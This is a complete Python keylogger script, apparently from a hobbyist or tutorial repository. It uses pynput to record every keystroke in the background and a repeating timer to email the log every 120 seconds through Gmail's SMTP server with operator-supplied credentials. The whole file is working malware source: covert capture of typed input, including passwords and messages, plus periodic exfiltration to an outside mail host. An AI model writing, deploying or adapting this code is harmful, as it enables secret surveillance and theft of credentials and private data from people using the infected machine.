#! /usr/bin/env python
import pynput.keyboard
import threading
import smtplib

#Creating a class for for the excution of the code 
class Keylogger:
    def __init__(self,time_interval,email,password):
        self.log ="Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password
    
    def append_to_log(self, string):
        self.log = self.log + string
    
    #Accepts the keyboard strikes and capture in the logs
    
    def process_keyboard_press(self,key):    
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key)+ " "
        self.append_to_log(current_key)   

#We use the threading module to have two way process working in background and report will capture keylog for every 120 seconds

    def report(self):
        self.send_mail(self.email,self.password,"\n\n"+self.log)
        self.log = ""
        timer =threading.Timer(self.interval,self.report)
        timer.start()


#Sending the captured keystrokes using gmail smtp server and use your own gmail    
    def send_mail(self,email,password,message):
        server=smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message)
        server.quit()



#Listener will start capturing the keystrokes

    def start(self):
        keyboard_listener=pynput.keyboard.Listener(on_press=self.process_keyboard_press)               

        with keyboard_listener:
            #self.report will report the keylogs for the more processing
            self.report()
            #start the listener to listen to every keystrokes
            keyboard_listener.join()



#You need to specify your won gmail and password for this code to happen 
your_gmail = "your own gmail account"
your_password = "your won password"


#Here the gmail will be send every 120 seconds you  can change the value as per your need 


my_keylogger=Keylogger(120,your_gmail,your_password)
my_keylogger.start()